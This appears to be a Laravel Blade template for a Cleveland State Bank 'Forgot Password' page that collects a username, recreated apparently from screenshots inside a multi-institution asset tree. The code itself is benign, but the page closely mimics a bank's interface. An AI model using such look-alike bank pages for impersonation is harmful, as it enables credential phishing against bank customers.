<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>Forgot Password | Cleveland State Bank</title>

<link rel="apple-touch-icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}">
<link rel="icon" href="{{ asset('assets/institutions/clevelandstatebank/images/favicon.png') }}" type="image/x-icon">

<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    min-height: 100vh;
    background-color: #edf0f4;
    background-image: url("{{ asset('assets/institutions/clevelandstatebank/images/csb-bg-ribbons.svg') }}");
    background-size: cover;
    background-position: center center;
    background-repeat: no-repeat;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 30px 16px;
    position: relative;
}

.csb-modal-card {
    width: 100%;
    max-width: 680px;
    background: #ffffff;
    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.25);
    border-radius: 2px;
    overflow: hidden;
}

/* Red Header Bar */
.modal-header-red {
    background-color: #c8232c;
    height: 44px;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
    padding: 0 16px;
}

.modal-header-title {
    color: #ffffff;
    font-size: 13.5px;
    font-weight: bold;
    letter-spacing: 0.8px;
    text-transform: uppercase;
    font-family: Arial, Helvetica, sans-serif;
}

.modal-close-btn {
    position: absolute;
    right: 16px;
    color: #ffffff;
    font-size: 18px;
    font-weight: bold;
    text-decoration: none;
    line-height: 1;
    cursor: pointer;
}

.modal-close-btn:hover {
    opacity: 0.8;
}

/* Modal Body */
.modal-body {
    padding: 32px 36px 36px;
    text-align: center;
}

.csb-modal-logo {
    width: 130px;
    height: auto;
    max-height: 140px;
    object-fit: contain;
    margin: 0 auto 20px;
    display: block;
}

.modal-divider {
    height: 1px;
    background-color: #e2e8f0;
    margin: 20px 0 24px;
    border: none;
}

.modal-instruction {
    text-align: left;
    font-size: 13.5px;
    color: #333333;
    margin-bottom: 14px;
    font-family: Arial, Helvetica, sans-serif;
}

.input-box-wrapper {
    position: relative;
    border: 1px solid #b0bec5;
    background: #ffffff;
    border-radius: 2px;
    margin-bottom: 24px;
}

.input-box-wrapper.has-error {
    border: 1.5px solid #c8232c !important;
    background-color: #fff8f8;
}

.csb-field-inline-err {
    color: #c8232c;
    font-size: 11.5px;
    font-weight: bold;
    text-align: center;
    margin-top: -16px;
    margin-bottom: 20px;
}

.csb-success-banner {
    background-color: #2e7d32;
    color: #ffffff;
    padding: 12px 16px;
    margin-bottom: 20px;
    font-size: 13px;
    font-weight: 500;
    border-radius: 2px;
}

.required-badge {
    position: absolute;
    top: 4px;
    right: 8px;
    font-size: 11px;
    color: #78909c;
    pointer-events: none;
}

.input-box-wrapper input {
    width: 100%;
    height: 52px;
    border: none;
    outline: none;
    padding: 10px 14px;
    font-size: 14px;
    font-weight: bold;
    color: #444444;
    text-align: center;
    letter-spacing: 0.6px;
}

.input-box-wrapper input::placeholder {
    color: #78909c;
    font-weight: bold;
    letter-spacing: 0.8px;
}

.csb-btn-continue {
    width: 220px;
    height: 44px;
    background-color: #e0e4e8;
    color: #78909c;
    border: none;
    border-radius: 2px;
    font-size: 13px;
    font-weight: bold;
    letter-spacing: 0.8px;
    cursor: pointer;
    text-transform: uppercase;
    display: block;
    margin: 0 auto;
    transition: background-color 0.2s, color 0.2s;
}

.csb-btn-continue.active {
    background-color: #1e355b;
    color: #ffffff;
}

.csb-btn-continue:hover {
    background-color: #1e355b;
    color: #ffffff;
}

.back-to-signin {
    margin-top: 18px;
    display: block;
    color: #1b325f;
    font-size: 13px;
    font-weight: 500;
    text-decoration: none;
}

.back-to-signin:hover {
    text-decoration: underline;
}

/* Error Banner Modal (Screenshot 5) */
.csb-error-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background: rgba(0, 0, 0, 0.45);
    z-index: 9999;
    display: flex;
    align-items: center;
    justify-content: center;
}

.csb-error-banner {
    width: 100%;
    background-color: #262626;
    color: #ffffff;
    padding: 32px 20px;
    text-align: center;
    box-shadow: 0 8px 30px rgba(0,0,0,0.6);
}

.csb-error-title {
    font-size: 14px;
    font-weight: bold;
    color: #e0e0e0;
    letter-spacing: 0.8px;
    margin-bottom: 12px;
    text-transform: uppercase;
}

.csb-error-desc {
    font-size: 13.5px;
    line-height: 1.5;
    color: #ffffff;
    max-width: 600px;
    margin: 0 auto 20px;
}

.csb-error-btn {
    background-color: #d9534f;
    border: none;
    color: #ffffff;
    font-size: 13px;
    font-weight: bold;
    padding: 8px 36px;
    border-radius: 2px;
    cursor: pointer;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.csb-error-btn:hover {
    background-color: #c9302c;
}
</style>
</head>
<body>

    <div class="csb-modal-card">
        <div class="modal-header-red">
            <span class="modal-header-title">FORGOT PASSWORD</span>
            <a href="{{ route('login') }}" class="modal-close-btn" title="Close">&#10005;</a>
        </div>

        <div class="modal-body">
            <img src="{{ asset('assets/institutions/clevelandstatebank/images/csb-modal-logo.png') }}" alt="Cleveland State Bank" class="csb-modal-logo">

            <div class="modal-divider"></div>

            @if (session('status'))
                <div class="csb-success-banner">
                    {{ session('status') }}
                </div>
            @endif

            <p class="modal-instruction">Enter your information below:</p>

            <form method="POST" action="{{ route('password.email') }}" id="csbForgotForm">
                @csrf

                <div class="input-box-wrapper @if($errors->has('email') || $errors->has('username')) has-error @endif">
                    <span class="required-badge">required</span>
                    <input 
                        type="text" 
                        name="email" 
                        id="forgotEmail" 
                        placeholder="USERNAME" 
                        value="{{ old('email') }}" 
                        required 
                        autofocus
                    >
                </div>
                @if($errors->has('email') || $errors->has('username'))
                    <div class="csb-field-inline-err">{{ $errors->first('email') ?: $errors->first('username') }}</div>
                @endif

                <button type="submit" class="csb-btn-continue" id="btnContinue">CONTINUE</button>

                <a href="{{ route('login') }}" class="back-to-signin">Back to Sign In</a>
            </form>
        </div>
    </div>

    <!-- Error Banner Overlay (Shown when error exists) -->
    @if ($errors->any() || session('error'))
    <div class="csb-error-overlay" id="errorOverlay">
        <div class="csb-error-banner">
            <div class="csb-error-title">AN ERROR HAS OCCURRED</div>
            <div class="csb-error-desc">
                {{ session('error') ?? ($errors->first() ?: 'The information you entered could not be properly validated. Please double check your information and if you feel it is correct please contact your financial institution for further help.') }}
            </div>
            <button type="button" class="csb-error-btn" onclick="document.getElementById('errorOverlay').style.display='none'">OK</button>
        </div>
    </div>
    @endif

    <script>
    document.addEventListener('DOMContentLoaded', function() {
        var input = document.getElementById('forgotEmail');
        var btn = document.getElementById('btnContinue');
        if (input && btn) {
            input.addEventListener('input', function() {
                if (input.value.trim().length > 0) {
                    btn.classList.add('active');
                } else {
                    btn.classList.remove('active');
                }
            });
            if (input.value.trim().length > 0) {
                btn.classList.add('active');
            }
        }
    });
    </script>
</body>
</html>
